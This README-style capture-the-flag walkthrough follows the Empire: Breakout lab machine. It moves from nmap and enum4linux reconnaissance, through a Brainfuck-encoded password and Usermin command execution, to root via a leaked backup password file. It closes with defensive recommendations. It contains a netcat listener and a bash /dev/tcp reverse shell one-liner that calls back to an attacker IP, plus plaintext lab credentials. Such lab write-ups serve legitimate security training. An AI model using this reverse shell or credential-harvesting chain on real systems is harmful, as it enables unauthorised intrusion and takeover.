# Empire: Breakout Penetration Testing Walkthrough
<h1 align="center">Empire: Breakout Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access - A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
</p>
---
## 📋 Overview
This guide documents the complete penetration testing methodology for Empire: Breakout, detailing each step from initial reconnaissance to privilege escalation and flag capture. This walkthrough serves as a continuation of the LupinOne series, focusing on a distinct set of exploitation techniques.

## 🎯 Objectives

- Identify the target system and open services.
- Enumerate hidden credentials within web application source code.
- Decode obfuscated strings to retrieve login credentials.
- Exploit command injection to gain an initial low-privilege reverse shell.
- Escalate privileges using exposed backup files.
- Capture both the user and root flags.

## 1. Reconnaissance.
### **Network Discovery.**
We will first run the command;
> $ ifconfig
---

- To check what IP is allocated to the attacking machine and also determine the subnet range.

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s1.png" alt="ifconfig Output" width="600"/> </p>

*Screenshot 1: ifconfig output showing network interfaces*

### **Host Discovery**
> $ nmap -sn 192.168.56.0/24
---
- We are trying to do a ping sweep to identify live hosts within the subnet.

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s2.png" alt="Nmap Ping Sweep" width="600"/> </p>

*Screenshot 2: Nmap ping sweep results*

### **Port Scan**
> $ nmap -A 192.168.56.20
---

- **-A** flag is for aggressive mode that bundles multiple flags for OS and service detection.

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s3.png" alt="Nmap Port Scan" width="600"/> </p>

*Screenshot 3: Detailed port scan results*

### Findings
From our previous scan we can see that:
- Port 80 (HTTP) - Apache httpd 2.4.51 (Debian)
- Port 139/445 (SMB) - Samba smbd 4
- Port 10000 (HTTP) - MiniServ 1.981 (Webmin)
- Port 20000 (HTTP) - MiniServ 1.830 (Usermin)

## 2. Web Enumeration & Credential Discovery.
### **Inspecting the Default Web Page**
Navigating to `http://192.168.56.20`, we encounter the default Apache2 Debian page.

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s4.png" alt="Apache Default Page" width="600"/> </p>

*Screenshot 4: Apache2 Debian default landing page*

### **Finding Hidden Source Code**
Viewing the page source (Ctrl+U) reveals a hidden comment at the very bottom of the HTML file containing encoded data.

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s9.png" alt="Source Code Comment" width="600"/> </p>

*Screenshot 5: Examining source code for hidden credentials*

### **Decoding Brainfuck Obfuscation**
The comment contains a string composed of `+`, `-`, `<`, `>`, `[`, `]`, `.`, `,`. This corresponds to the **Brainfuck** programming language.
We use an online Brainfuck interpreter to decode the string.

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s10.png" alt="Brainfuck Decoder" width="600"/> </p>

*Screenshot 6: Decoding the hidden text using a Brainfuck interpreter*

**Decoded String:** `.2uqPEf3jD<P`a-3`

## 3. Initial Web Login.
### **Accessing Usermin Interface**
We open the Usermin web interface running on port `20000`.
> http://192.168.56.20:20000
---

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s6.png" alt="Usermin Login" width="600"/> </p>

*Screenshot 7: Usermin login portal on port 20000*

### **Finding Valid Username**
Running an enumeration scan on the target reveals a valid local user named `cyber`.
> $ enum4linux -U 192.168.56.20

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s7.png" alt="Enum4Linux Output" width="600"/> </p>


<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s8.png" alt="Enum4Linux Output" width="600"/> </p>

*Screenshot 8: Enum4Linux discovering the user 'cyber'*

### **Logging In**
Using the discovered username (`cyber`) and the decoded Brainfuck password, we successfully log into the Usermin dashboard.

## 4. Command Injection & Reverse Shell.
### **Exploiting Custom Commands**
Once inside the Usermin dashboard, we navigate to the **Custom Commands** section. This area allows us to execute system commands directly on the target server.

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s11.png" alt="Usermin Custom Commands" width="600"/> </p>

*Screenshot 9: Executing commands via Usermin Custom Commands*
### **Establishing Reverse Shell**
We set up a netcat listener on the attacker machine:
> $ nc -nlvp 999

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s12.png" alt="Netcat Listener" width="600"/> </p>

*Screenshot 10: Gaining an interactive shell as user 'cyber'*

We craft a reverse shell payload to connect back to our attacker machine.
> $ bash -i >& /dev/tcp/192.168.56.12/999 0>&1
---

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s13.png" alt="Reverse Shell" width="600"/> </p>


### **Upgrading the Shell**
We upgrade the limited shell to a fully interactive TTY session for better navigation.
> cyber@breakout:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
> cyber@breakout:~$ export TERM=xterm

## 5. User Flag.
### **Capturing User Flag**
From the home directory, we capture the user flag.

> cyber@breakout:~$ ls
> user.txt
> cyber@breakout:~$ cat user.txt

---

**User Flag:** `3mp1r3{You_Manage_To_Break_To_My_Secure_Access}`

---
## 6. Privilege Escalation.
### **Enumerating Backup Files**
We check the `/var/backups` directory for sensitive leftover files.
> cyber@breakout:~$ ls -alps /var/backups

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s14.png" alt="Backup file enumeration" width="600"/> </p>

*Screenshot 11: Identifying the `.old_pass.bak` file*

### **Extracting Root Credentials**
We find a file named `.old_pass.bak`. Reading its contents provides a high-entropy string.
> cyber@breakout:~$ cat /var/backups/.old_pass.bak

**Output:** `Ts&4&YurgtRX(==~h`

### **Switching to Root User**
We attempt to use this string as the password for the root user.

> cyber@breakout:~$ su

**Enter Password:** `Ts&4&YurgtRX(==~h`

<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s16.png" alt="Root Access" width="600"/> </p>

*Screenshot 12: Successfully escalating to root*

## 7. Root Flag.
### **Capturing Root Flag**
> root@breakout:/var/backups# cd /root
> root@breakout:/root# ls
> r00t.txt
> root@breakout:/root# cat r00t.txt
---

## 🔒 Security Recommendations

- **Source Code Hygiene:** Never embed encoded credentials, even in comments, within client-side source code.
- **Web Application Restrictions:** Disable or restrict access to "Custom Commands" in Usermin/Webmin for unprivileged users.
- **Backup File Protection:** Do not store plaintext passwords in backup files. If necessary, encrypt them and restrict file permissions to root only.
- **User Enumeration:** Disable SMB null session enumeration to prevent attackers from identifying valid local usernames.
- **Password Rotation:** Implement strict password rotation policies for the root account and system administrators.

## 🔧 Tools Used

```bash
🛡️ Network & Service Discovery:
- ifconfig · Nmap · enum4linux

🔓 Exploitation Tools:
- Brainfuck Interpreter · Netcat · Python3

🔍 Information Gathering:
- Web Browser (Source Viewer) · cat · ls

💻 System Tools:
- sudo · su · pty
